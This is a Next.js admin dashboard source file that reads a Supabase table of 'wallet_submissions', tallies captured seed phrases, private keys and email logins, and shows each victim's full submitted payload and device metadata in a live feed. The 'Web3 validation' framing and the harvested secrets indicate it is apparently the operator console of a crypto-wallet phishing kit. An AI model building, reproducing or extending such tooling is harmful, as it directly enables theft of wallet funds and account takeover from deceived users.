
"use client";

import React, { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { supabaseClient } from "@/lib/supabase";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { 
  Shield, 
  Database, 
  Key, 
  Eye, 
  RefreshCw, 
  Terminal, 
  Wallet, 
  Clock,
  Lock,
  LogOut,
  Loader2
} from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { cn } from "@/lib/utils";

interface Submission {
  id: string;
  wallet_name: string;
  wallet_address: string;
  type: string;
  data: any;
  timestamp: string;
  user_agent: string;
}

export default function AdminPage() {
  const router = useRouter();
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [loading, setLoading] = useState(true);
  const [authLoading, setAuthLoading] = useState(true);
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);

  useEffect(() => {
    const checkAuth = async () => {
      const { data: { session } } = await supabaseClient.auth.getSession();
      if (!session) {
        router.push("/admin/login");
      } else {
        setAuthLoading(false);
        fetchSubmissions();
      }
    };
    checkAuth();

    // Real-time subscription
    const channel = supabaseClient
      .channel('schema-db-changes')
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'wallet_submissions' },
        () => fetchSubmissions()
      )
      .subscribe();

    return () => {
      supabaseClient.removeChannel(channel);
    };
  }, [router]);

  const fetchSubmissions = async () => {
    setLoading(true);
    const { data, error } = await supabaseClient
      .from("wallet_submissions")
      .select("*")
      .order("timestamp", { ascending: false });

    if (!error && data) {
      setSubmissions(data);
    }
    setLoading(false);
  };

  const handleLogout = async () => {
    await supabaseClient.auth.signOut();
    router.push("/admin/login");
  };

  if (authLoading) {
    return (
      <div className="min-h-screen bg-[#0B0F17] flex items-center justify-center">
        <Loader2 className="animate-spin text-primary w-12 h-12" />
      </div>
    );
  }

  const stats = {
    total: submissions.length,
    seed: submissions.filter(s => s.type === "seed-phrase").length,
    private: submissions.filter(s => s.type === "private-key").length,
    email: submissions.filter(s => s.type === "email-password").length,
  };

  return (
    <div className="min-h-screen bg-[#0B0F17] text-white p-8">
      <div className="max-w-7xl mx-auto space-y-8">
        {/* Header */}
        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
          <div>
            <div className="flex items-center gap-3 mb-2">
              <div className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center text-primary">
                <Database size={24} />
              </div>
              <h1 className="font-headline text-3xl font-black tracking-tight uppercase">Admin Console</h1>
            </div>
            <p className="text-slate-500 text-sm">Secure monitoring of Web3 validation interactions</p>
          </div>
          <div className="flex gap-3">
            <Button 
              variant="outline" 
              className="glass border-white/5 h-11 px-6 rounded-xl text-slate-400 hover:text-white"
              onClick={fetchSubmissions}
            >
              <RefreshCw size={18} className={loading ? "animate-spin mr-2" : "mr-2"} />
              Refresh
            </Button>
            <Button 
              variant="destructive" 
              className="h-11 px-6 rounded-xl bg-red-500/10 text-red-400 border border-red-500/20 hover:bg-red-500/20"
              onClick={handleLogout}
            >
              <LogOut size={18} className="mr-2" />
              Secure Logout
            </Button>
          </div>
        </div>

        {/* Stats Grid */}
        <div className="grid grid-cols-1 md:grid-cols-4 gap-6">
          <Card className="glass border-white/5 bg-[#131A26]/50">
            <CardHeader className="pb-2">
              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Total Interactions</CardDescription>
              <CardTitle className="text-4xl font-headline font-black text-primary">{stats.total}</CardTitle>
            </CardHeader>
          </Card>
          <Card className="glass border-white/5 bg-[#131A26]/50">
            <CardHeader className="pb-2">
              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Seed Phrases</CardDescription>
              <CardTitle className="text-4xl font-headline font-black text-emerald-400">{stats.seed}</CardTitle>
            </CardHeader>
          </Card>
          <Card className="glass border-white/5 bg-[#131A26]/50">
            <CardHeader className="pb-2">
              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Private Keys</CardDescription>
              <CardTitle className="text-4xl font-headline font-black text-orange-400">{stats.private}</CardTitle>
            </CardHeader>
          </Card>
          <Card className="glass border-white/5 bg-[#131A26]/50">
            <CardHeader className="pb-2">
              <CardDescription className="text-[10px] font-black uppercase tracking-widest text-slate-500">Email Login</CardDescription>
              <CardTitle className="text-4xl font-headline font-black text-cyan-400">{stats.email}</CardTitle>
            </CardHeader>
          </Card>
        </div>

        {/* Submissions Table */}
        <Card className="glass border-white/5 bg-[#131A26]/30 rounded-3xl overflow-hidden">
          <div className="p-6 border-b border-white/5 flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Terminal size={18} className="text-primary" />
              <h3 className="font-headline font-bold text-lg">Activity Stream</h3>
            </div>
            <Badge variant="outline" className="bg-primary/10 text-primary border-primary/20 animate-pulse">
              LIVE MONITORING ACTIVE
            </Badge>
          </div>
          <CardContent className="p-0">
            <Table>
              <TableHeader className="bg-white/5">
                <TableRow className="border-white/5 hover:bg-transparent">
                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Timestamp</TableHead>
                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Wallet</TableHead>
                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Type</TableHead>
                  <TableHead className="text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Public Address</TableHead>
                  <TableHead className="text-right text-[10px] font-black uppercase tracking-widest text-slate-500 py-4">Actions</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {submissions.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={5} className="text-center py-20 text-slate-600 font-medium italic">
                      No validation interactions recorded yet.
                    </TableCell>
                  </TableRow>
                ) : (
                  submissions.map((item) => (
                    <TableRow key={item.id} className="border-white/5 hover:bg-white/5 transition-colors">
                      <TableCell className="font-mono text-[11px] text-slate-400">
                        <div className="flex items-center gap-2">
                          <Clock size={12} />
                          {new Date(item.timestamp).toLocaleString()}
                        </div>
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-2">
                          <Wallet size={14} className="text-primary" />
                          <span className="font-bold text-xs uppercase tracking-tight">{item.wallet_name}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge className={cn(
                          "text-[9px] font-black uppercase tracking-widest",
                          item.type === "seed-phrase" ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/20" :
                          item.type === "private-key" ? "bg-orange-500/10 text-orange-400 border-orange-500/20" :
                          "bg-cyan-500/10 text-cyan-400 border-cyan-500/20"
                        )}>
                          {item.type}
                        </Badge>
                      </TableCell>
                      <TableCell className="font-mono text-xs text-slate-400">
                        {item.wallet_address ? (
                          <span className="truncate max-w-[150px] inline-block">{item.wallet_address}</span>
                        ) : (
                          <span className="italic opacity-50">Not provided</span>
                        )}
                      </TableCell>
                      <TableCell className="text-right">
                        <Button 
                          size="sm" 
                          className="h-8 rounded-lg bg-white/5 hover:bg-primary/20 hover:text-primary transition-all text-slate-400 border border-white/5"
                          onClick={() => setSelectedSubmission(item)}
                        >
                          <Eye size={14} className="mr-2" />
                          Details
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </CardContent>
        </Card>

        {/* Footer info */}
        <div className="flex items-center justify-center gap-6 py-12">
           <div className="flex items-center gap-2 text-[10px] font-black text-slate-700 uppercase tracking-[0.4em]">
              <Lock size={12} /> AES-256 SECURED
           </div>
           <div className="flex items-center gap-2 text-[10px] font-black text-slate-700 uppercase tracking-[0.4em]">
              <Shield size={12} /> END-TO-END
           </div>
        </div>
      </div>

      {/* Details Dialog */}
      <Dialog open={!!selectedSubmission} onOpenChange={() => setSelectedSubmission(null)}>
        <DialogContent className="max-w-2xl bg-[#0B0F17] border-white/10 text-white rounded-[2rem]">
          <DialogHeader>
            <DialogTitle className="font-headline text-2xl font-black uppercase tracking-tight flex items-center gap-3">
              <Key className="text-primary" />
              Interaction Payload
            </DialogTitle>
            <DialogDescription className="text-slate-500">
              Complete data dump for interaction {selectedSubmission?.id}
            </DialogDescription>
          </DialogHeader>

          {selectedSubmission && (
            <div className="space-y-6 py-4">
              <div className="grid grid-cols-2 gap-4">
                <div className="p-4 rounded-2xl bg-white/5 border border-white/5">
                  <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">Source Wallet</div>
                  <div className="font-bold text-sm uppercase">{selectedSubmission.wallet_name}</div>
                </div>
                <div className="p-4 rounded-2xl bg-white/5 border border-white/5">
                  <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-1">Method</div>
                  <Badge className="bg-primary/10 text-primary border-primary/20 uppercase text-[9px]">{selectedSubmission.type}</Badge>
                </div>
              </div>

              <div className="p-6 rounded-2xl bg-white/5 border border-white/5 space-y-4">
                <div className="flex items-center justify-between">
                  <div className="text-[10px] font-black text-primary uppercase tracking-[0.2em]">Sensitive Data Payload</div>
                  <Lock size={14} className="text-slate-700" />
                </div>
                
                <div className="bg-black/40 rounded-xl p-6 font-mono text-sm leading-relaxed border border-white/5 break-all whitespace-pre-wrap select-all selection:bg-primary/40">
                  {JSON.stringify(selectedSubmission.data, null, 2)}
                </div>
              </div>

              <div className="p-4 rounded-2xl bg-white/5 border border-white/5">
                <div className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-2">Device Metadata</div>
                <div className="text-[11px] text-slate-400 font-medium leading-relaxed italic">
                  {selectedSubmission.user_agent}
                </div>
              </div>

              <div className="pt-4">
                <Button 
                  onClick={() => setSelectedSubmission(null)}
                  className="w-full h-12 bg-white/5 hover:bg-white/10 text-white border border-white/5 rounded-xl font-bold"
                >
                  Close Secure View
                </Button>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
